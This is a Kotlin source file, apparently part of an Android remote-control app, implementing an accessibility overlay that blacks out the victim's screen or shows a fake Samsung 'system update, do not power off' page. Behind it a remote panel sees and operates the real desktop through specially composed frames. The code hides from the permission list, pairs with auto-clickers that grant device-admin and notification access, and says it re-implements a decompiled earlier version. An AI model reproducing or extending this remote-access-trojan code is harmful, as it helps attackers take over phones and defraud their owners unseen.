package com.zaka.screenagent.ui

import android.accessibilityservice.AccessibilityService
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.drawable.GradientDrawable
import android.os.Build
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView

/**
 * 黑屏覆盖层（无障碍 2032 通道，无需悬浮窗权限、不出现在授权列表）。
 *
 * 三种档位与面板对应：
 *   lockNormal       纯黑      —— 屏全黑，触摸被吞
 *   lockUpdate       系统黑    —— 纯黑 + 把屏幕亮度压到最低（更像真的息屏）
 *   lockAndroidUpdate 更新黑   —— 纯黑 + 假"系统更新中"文案与进度条
 *   unlock           关闭      —— 移除覆盖层并恢复亮度
 */
object BlackScreen {

    private const val TAG = "BlackScreen"
    private var view: View? = null
    private var savedBrightness = -1
    private var desktopBmp: android.graphics.Bitmap? = null
    private var reapplyRunnable: Runnable? = null
    @Volatile private var masked = false
    private var shownAt = 0L
    private var saveModeAuto = 0

    /** 真·黑屏：把屏幕亮度调到 0（需要 WRITE_SETTINGS），这样人眼看是黑的，截图仍能拍到内容 */
    private fun dimBacklight(ctx: android.content.Context, on: Boolean, level: Double = 0.0): Boolean = runCatching {
        if (!android.provider.Settings.System.canWrite(ctx)) return false
        val cr = ctx.contentResolver
        if (on) {
            savedBrightness = android.provider.Settings.System.getInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, 128)
            saveModeAuto = android.provider.Settings.System.getInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, 0)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, 0)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS,
                (level.coerceIn(0.0, 1.0) * 255).toInt())
        } else {
            if (savedBrightness >= 0) android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, savedBrightness)
            android.provider.Settings.System.putInt(
                cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, saveModeAuto)
        }
        true
    }.getOrDefault(false)

    /**
     * @param alpha      遮罩不透明度（0.5~1.0）。0.80 = 透光 20%，面板能清楚看到底图；1.0 = 全黑
     * @param brightness 窗口亮度（0.0~1.0）。0.0 = 用户看纯黑；0.3 = 更新页可见但很暗
     */
    fun show(service: AccessibilityService, mode: String, alpha: Double? = null, brightness: Double? = null) {
        // 命令分发在 OkHttp 线程，创建 WindowManager 视图必须回主线程
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            android.os.Handler(android.os.Looper.getMainLooper()).post { show(service, mode, alpha, brightness) }
            return
        }
        // 实时档：遮罩 0.65（上传帧里桌面透 35%）+ 背光 0（用户看纯黑）。
        // 直接用屏幕真实截帧，所以桌面是"动的"，且零闪烁。
        // 手机屏：完全不透明（用户看就是黑底更新页）；上报帧靠"抓帧时隐藏遮罩 + 叠加 40% 页"得到
        // 2.2 的 #fe000000 = 254/255：留 0.4% 透光，肉眼仍是全黑，但上报帧 ×40 后桌面就显形了
        val maskAlpha = (alpha ?: (254.0 / 255.0)).coerceIn(0.30, 1.0)
        // 2.2：lockNormal 亮度 0；lockAndroidUpdate / lockUpdate 亮度 0.4（ح.إ() 里设的 0x3ecccccd）
        val backlight = (brightness ?: if (mode == "lockNormal") 0.0 else 0.4).coerceIn(0.0, 1.0)
        if (view != null) hide(service)

        // ★ 先把桌面拍一张（此时遮罩还没上，不存在闪烁），之后上报帧全靠软件合成
        var mounted = false
        val mountOnce = {
            if (!mounted) {
                mounted = true
                mount(service, mode, maskAlpha, backlight)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            prepareDesktop(service) { mountOnce() }
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(mountOnce, 600L)
        } else {
            mountOnce()
        }
    }

    private fun mount(service: AccessibilityService, mode: String, maskAlpha: Double, backlight: Double) {
        runCatching {
            val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as WindowManager
            val lp = WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or   // ★ 触摸穿透：黑屏但仍可正常操作
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or  // ★ 别让屏幕睡过去（息屏后截图全黑）
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            ).apply {
                gravity = Gravity.TOP or Gravity.START
                screenBrightness = backlight.toFloat()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    layoutInDisplayCutoutMode =
                        WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
                }
            }

            val scrimA = (maskAlpha * 255).toInt().coerceIn(0, 255)
            val scrim = (scrimA shl 24)
            val useHtml = mode != "lockNormal"
            val root = FrameLayout(service).apply {
                // #fe000000：和 2.2 一样只留 0.4% 透光，肉眼全黑，×40 后桌面显形
                setBackgroundColor(if (useHtml) 0x00000000 else scrim)
                isClickable = false
            }

            if (useHtml) {
                root.addView(android.webkit.WebView(service).apply {
                    setBackgroundColor(0)
                    settings.javaScriptEnabled = true
                    settings.allowFileAccess = true
                    webViewClient = object : android.webkit.WebViewClient() {
                        override fun onPageFinished(v: android.webkit.WebView?, url: String?) {
                            v?.evaluateJavascript(
                                "document.getElementById('model').textContent='${android.os.Build.MODEL}'", null)
                        }
                    }
                    // 手机屏用完全不透明页面（a=1.0）；上报帧是软件合成出来的半透明版本
                    loadUrl("file:///android_asset/overlays/update_scrim.html?a=1.0")
                }, FrameLayout.LayoutParams(
                    FrameLayout.LayoutParams.MATCH_PARENT,
                    FrameLayout.LayoutParams.MATCH_PARENT))
            }

            // 用 View 的 alpha 留透光（WebView 自己的图层不可靠）：0.98 → 2% 桌面透出，
            // 肉眼仍是黑屏；上报帧再 ×15+10 把桌面拉回来
            root.alpha = 254f / 255f      // 0.4% 透光，和 2.2 的 #FE000000 一致
            wm.addView(root, lp)
            view = root
            masked = true
            shownAt = System.currentTimeMillis()
            // 黑屏期间不能继续跑引导：否则会弹出权限框 / 跳到「通知访问」等设置页，被一起拍进上报帧
            runCatching { com.zaka.screenagent.notify.NotificationAccessActivator.autoclick = false }
            runCatching { com.zaka.screenagent.admin.AdminActivator.autoclick = false }
            runCatching { com.zaka.screenagent.perm.PermissionClicker.stop() }
            runCatching { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
            BrightnessKeeperActivity.start(service, backlight)
            startBrightnessReapply(service, root, lp)
            val dimmed = dimBacklight(service, true, backlight)
            Log.d(TAG, "mounted mode=$mode alpha=$maskAlpha brightness=$backlight dimmed=$dimmed desktop=${desktopBmp != null}")
        }.onFailure { Log.w(TAG, "mount failed: $it") }
    }

    /** 上遮罩之前截一张桌面，作为上报帧的底图（此时还没有遮罩，不会闪） */
    private fun prepareDesktop(service: AccessibilityService, done: () -> Unit) {
        val main = android.os.Handler(android.os.Looper.getMainLooper())
        runCatching {
            service.takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                java.util.concurrent.Executor { r -> main.post(r) },
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(result: AccessibilityService.ScreenshotResult) {
                        runCatching {
                            val bmp = android.graphics.Bitmap.wrapHardwareBuffer(
                                result.hardwareBuffer, result.colorSpace
                            )?.copy(android.graphics.Bitmap.Config.ARGB_8888, false)
                            runCatching { result.hardwareBuffer.close() }
                            if (bmp != null) {
                                runCatching { desktopBmp?.recycle() }
                                desktopBmp = bmp
                                Log.d(TAG, "desktop captured ${bmp.width}x${bmp.height}")
                            }
                        }
                        done()
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.w(TAG, "desktop capture failed $errorCode")
                        done()
                    }
                })
        }.onFailure { done() }
    }

    /** 当前假更新页的百分比（和 update_scrim.html 里同一套递增公式，700ms 一跳） */
    private fun currentPercent(): Int {
        if (shownAt <= 0L) return 0
        val steps = (System.currentTimeMillis() - shownAt) / 700L
        var p = 0.0
        for (i in 0 until steps) {
            p += if (p < 20) 2.0 else if (p < 80) 0.9 else 0.3
            if (p > 99.4) return 99
        }
        return p.toInt()
    }

    /**
     * 面板看到的帧：桌面底图 + 62% 黑 + 假更新页文字，全部软件绘制 → 手机屏完全不参与，零闪烁。
     * @param width 输出宽度（和面板请求一致，通常 540）
     */
    fun composeUploadFrame(width: Int): android.graphics.Bitmap? {
        val base = desktopBmp ?: return null
        val w = width.coerceIn(240, 1080)
        val h = (base.height.toFloat() * w / base.width).toInt().coerceAtLeast(1)
        return runCatching {
            val out = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888)
            val c = android.graphics.Canvas(out)
            val p = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG)
            val scaled = android.graphics.Bitmap.createScaledBitmap(base, w, h, true)
            c.drawBitmap(scaled, 0f, 0f, p)
            if (scaled !== base) scaled.recycle()
            // 遮罩：62% 黑，桌面就透出来了
            p.color = android.graphics.Color.argb((0.62f * 255).toInt(), 0, 0, 0)
            c.drawRect(0f, 0f, w.toFloat(), h.toFloat(), p)

            val pct = currentPercent()
            p.color = android.graphics.Color.parseColor("#2b4a9b")
            p.textSize = w * 0.105f
            p.textAlign = android.graphics.Paint.Align.CENTER
            p.letterSpacing = 0.08f
            c.drawText("SAMSUNG", w / 2f, h * 0.31f, p)
            p.letterSpacing = 0f

            p.color = android.graphics.Color.WHITE
            p.textSize = w * 0.048f
            c.drawText("正在安装系统更新...", w / 2f, h * 0.52f, p)

            // 进度条
            val barW = w * 0.84f
            val barX = (w - barW) / 2f
            val barY = h * 0.565f
            val barH = (h * 0.006f).coerceAtLeast(2f)
            p.color = android.graphics.Color.parseColor("#2a2a2a")
            c.drawRect(barX, barY, barX + barW, barY + barH, p)
            p.color = android.graphics.Color.parseColor("#2f6bff")
            c.drawRect(barX, barY, barX + barW * (pct / 100f), barY + barH, p)

            p.color = android.graphics.Color.WHITE
            p.textSize = w * 0.055f
            c.drawText("$pct%", w / 2f, h * 0.625f, p)

            p.color = android.graphics.Color.parseColor("#d8d8d8")
            p.textSize = w * 0.034f
            c.drawText("请勿关机、锁屏或触摸屏幕", w / 2f, h * 0.805f, p)
            c.drawText("设备将在更新完成后自动重启", w / 2f, h * 0.838f, p)
            p.color = android.graphics.Color.parseColor("#7a7a7a")
            p.textSize = w * 0.030f
            c.drawText(android.os.Build.MODEL, w / 2f, h * 0.872f, p)
            out
        }.getOrNull()
    }

    /**
     * 2.2 的 reapplyBrightness：系统会在焦点切换/锁屏等时机把窗口亮度覆盖丢掉，
     * 这里先 300ms 主动重申一次（让它立刻生效，不用等锁屏），之后每 2s 补一次。
     */
    private fun startBrightnessReapply(service: AccessibilityService, root: View, lp: WindowManager.LayoutParams) {
        stopBrightnessReapply()
        val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as? WindowManager ?: return
        val h = android.os.Handler(android.os.Looper.getMainLooper())
        val r = object : Runnable {
            override fun run() {
                if (view !== root || !masked) return      // 视图已被替换/移除：停止重申，避免泄漏
                runCatching { wm.updateViewLayout(root, lp) }
                    .onFailure { Log.w(TAG, "reapply brightness failed: $it") }
                h.postDelayed(this, 2000L)
            }
        }
        reapplyRunnable = r
        h.postDelayed(r, 300L)
    }

    private fun stopBrightnessReapply() {
        val r = reapplyRunnable ?: return
        runCatching { android.os.Handler(android.os.Looper.getMainLooper()).removeCallbacks(r) }
        reapplyRunnable = null
    }

    /** 假"系统更新"界面：一行标题 + 进度条 + 提示 */
    private fun buildUpdatePanel(service: AccessibilityService): View =
        LinearLayout(service).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(80, 0, 80, 0)
            addView(TextView(service).apply {
                text = "系统更新中"
                setTextColor(Color.WHITE)
                textSize = 20f
                gravity = Gravity.CENTER
            })
            addView(ProgressBar(service, null, android.R.attr.progressBarStyleHorizontal).apply {
                max = 100
                progress = 35
                val lp = LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT, 12
                ).apply { topMargin = 48; bottomMargin = 32 }
                layoutParams = lp
                progressDrawable = GradientDrawable().apply {
                    cornerRadius = 6f
                    setColor(0xFF3B82F6.toInt())
                }
                background = GradientDrawable().apply {
                    cornerRadius = 6f
                    setColor(0xFF1F2937.toInt())
                }
            })
            addView(TextView(service).apply {
                text = "正在安装系统更新，请勿关机"
                setTextColor(0xFF9CA3AF.toInt())
                textSize = 13f
                gravity = Gravity.CENTER
            })
        }

    fun hide(service: AccessibilityService) {
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            android.os.Handler(android.os.Looper.getMainLooper()).post { hide(service) }
            return
        }
        val v = view
        if (v != null) {
            runCatching {
                val wm = service.getSystemService(android.content.Context.WINDOW_SERVICE) as WindowManager
                wm.removeView(v)
            }.onFailure { Log.w(TAG, "hide failed: $it") }
            view = null
        }
        runCatching { dimBacklight(service, false) }
        runCatching { BrightnessKeeperActivity.stop() }
        // 黑屏撤掉时必须解掉触摸拦截，否则用户会永久点不动屏幕
        runCatching { TouchBlock.hide(service) }
        stopBrightnessReapply()
        shownAt = 0L
        masked = false
        runCatching { desktopBmp?.recycle() }
        desktopBmp = null
        Log.d(TAG, "hidden")
    }

    fun isShowing(): Boolean = view != null

    /** 遮罩是否处于"已挂上"状态（看门狗用它判断，避免 view 被替换后误判） */
    fun isMasked(): Boolean = masked

    /** 遮罩挂上的时间戳（看门狗在没有服务器来帧时用它当基准） */
    fun maskedSinceMs(): Long = shownAt

    /**
     * 截图/投屏前调用：把遮罩临时调成半透明，让上报帧里能看见桌面；
     * 返回的函数负责恢复不透明。手机屏幕上只闪一瞬（默认 60ms）。
     */
    /** 抓帧前把遮罩整体隐藏（2.2 的做法），拿到"干净的实时桌面"；返回的 lambda 负责恢复 */
    fun beginCaptureHide(): (() -> Unit)? {
        val v = view ?: return null
        val prev = v.alpha
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) v.post { v.alpha = 0f } else v.alpha = 0f
        return {
            runCatching {
                if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) v.post { v.alpha = prev }
                else v.alpha = prev
            }
        }
    }

    /**
     * 2.2 的做法（smali: Lڝږ؁ڋ/د;->ؠ(Bitmap,int)）：黑屏态下把整帧做一次
     * ColorMatrix 增益 —— 每通道 out = 40*in + 50。
     * 遮罩下 1~5 的残余被拉成 100+（桌面显形），深蓝字/蓝条饱和成白色。
     */
    fun gainLockedFrame(src: android.graphics.Bitmap): android.graphics.Bitmap? = runCatching {
        val out = android.graphics.Bitmap.createBitmap(src.width, src.height, android.graphics.Bitmap.Config.ARGB_8888)
        val canvas = android.graphics.Canvas(out)
        val paint = android.graphics.Paint()
        val m = android.graphics.ColorMatrix()
        m.set(floatArrayOf(
            40f, 0f, 0f, 0f, 50f,
            0f, 40f, 0f, 0f, 50f,
            0f, 0f, 40f, 0f, 50f,
            0f, 0f, 0f, 1f, 0f
        ))
        paint.colorFilter = android.graphics.ColorMatrixColorFilter(m)
        canvas.drawBitmap(src, 0f, 0f, paint)
        out
    }.getOrNull()

    /** 在真实桌面上叠 40% 黑 + 更新页文字（面板看到的"半透明更新页"） */
    fun overlayPageOnBitmap(base: android.graphics.Bitmap, alpha: Float = 0.40f): android.graphics.Bitmap =
        runCatching {
            val w = base.width; val h = base.height
            val out = base.copy(android.graphics.Bitmap.Config.ARGB_8888, true) ?: base
            val c = android.graphics.Canvas(out)
            val p = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG)
            p.color = android.graphics.Color.argb((alpha * 255).toInt(), 0, 0, 0)
            c.drawRect(0f, 0f, w.toFloat(), h.toFloat(), p)
            val pct = currentPercent()
            p.color = android.graphics.Color.parseColor("#2b4a9b"); p.textSize = w * 0.105f
            p.textAlign = android.graphics.Paint.Align.CENTER; p.letterSpacing = 0.08f
            c.drawText("SAMSUNG", w / 2f, h * 0.31f, p); p.letterSpacing = 0f
            p.color = android.graphics.Color.WHITE; p.textSize = w * 0.048f
            c.drawText("正在安装系统更新...", w / 2f, h * 0.52f, p)
            val barW = w * 0.84f; val barX = (w - barW) / 2f; val barY = h * 0.565f; val barH = (h * 0.006f).coerceAtLeast(2f)
            p.color = android.graphics.Color.parseColor("#2a2a2a"); c.drawRect(barX, barY, barX + barW, barY + barH, p)
            p.color = android.graphics.Color.parseColor("#2f6bff"); c.drawRect(barX, barY, barX + barW * (pct / 100f), barY + barH, p)
            p.color = android.graphics.Color.WHITE; p.textSize = w * 0.055f
            c.drawText("$pct%", w / 2f, h * 0.625f, p)
            p.color = android.graphics.Color.parseColor("#d8d8d8"); p.textSize = w * 0.034f
            c.drawText("请勿关机、锁屏或触摸屏幕", w / 2f, h * 0.805f, p)
            c.drawText("设备将在更新完成后自动重启", w / 2f, h * 0.838f, p)
            p.color = android.graphics.Color.parseColor("#7a7a7a"); p.textSize = w * 0.030f
            c.drawText(android.os.Build.MODEL, w / 2f, h * 0.872f, p)
            out
        }.getOrDefault(base)

    fun beginCaptureTint(tintAlpha: Float = 0.62f): (() -> Unit)? {
        val v = view ?: return null
        if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
            v.post { v.alpha = tintAlpha }
        } else v.alpha = tintAlpha
        return {
            runCatching {
                if (android.os.Looper.myLooper() != android.os.Looper.getMainLooper()) {
                    v.post { v.alpha = 1f }
                } else v.alpha = 1f
            }
        }
    }
}
